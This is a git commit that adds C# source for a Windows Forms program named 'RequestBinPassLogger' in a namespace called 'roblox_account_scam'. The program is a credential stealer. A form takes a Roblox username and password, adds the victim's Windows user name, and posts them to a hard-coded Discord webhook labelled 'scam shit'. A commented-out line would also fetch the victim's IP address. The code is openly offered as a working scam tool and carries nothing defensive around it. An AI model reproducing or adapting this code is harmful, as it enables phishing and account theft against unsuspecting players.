516351598836e3889dbc0afabe17f83f9c15fd01
Jumpy22 <megagear2828@gmail.com>
2020-02-14 16:16:52 -0500

    Add files via upload

---
+++ RequestBinPassLogger/RequestBinPassLogger/Form1.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.Collections.Specialized;
+using System.Windows.Forms;
+
+namespace roblox_account_scam
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            webhook("https://discordapp.com/api/webhooks/663422008532533259/dYkQWNKigfzOryLpeSSq8iIDdmDuD-abYwQeybIUeFsezOFZ5n-ublCKUZ8H2nFyiFne", string.Concat(new string[]
+                               {
+                            "```Username: ",
+                            Environment.UserName.ToString(),
+                            "\r\nUsername: ",
+                            textBox1.Text.ToString(),
+                            "\r\nPassword: ",
+                            maskedTextBox1.Text.ToString(),
+                            "\r\nIP: ",
+                            //new WebClient().DownloadString("http://api.ipify.org/"),                  
+                            "```"
+
+                               }));
+        }
+
+        public static void webhook(string webhook, string msg)
+        {
+            send.Post(webhook, new NameValueCollection
+            {
+                {
+                    "username",
+                    "scam shit"
+                },
+                {
+                    "content",
+                    msg
+                }
+            });
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
---
+++ RequestBinPassLogger/RequestBinPassLogger/post.cs
@@ -0,0 +1,20 @@
+﻿using System.Collections.Specialized;
+using System.Net;
+
+namespace roblox_account_scam
+{
+    class send
+    {
+        public static byte[] Post(string uri, NameValueCollection pairs)
+        {
+            byte[] result = null;
+            using (WebClient webClient = new WebClient())
+            {
+                result = webClient.UploadValues(uri, pairs);
+                webClient.Dispose();
+            }
+            return result;
+
+        }
+    }
+}
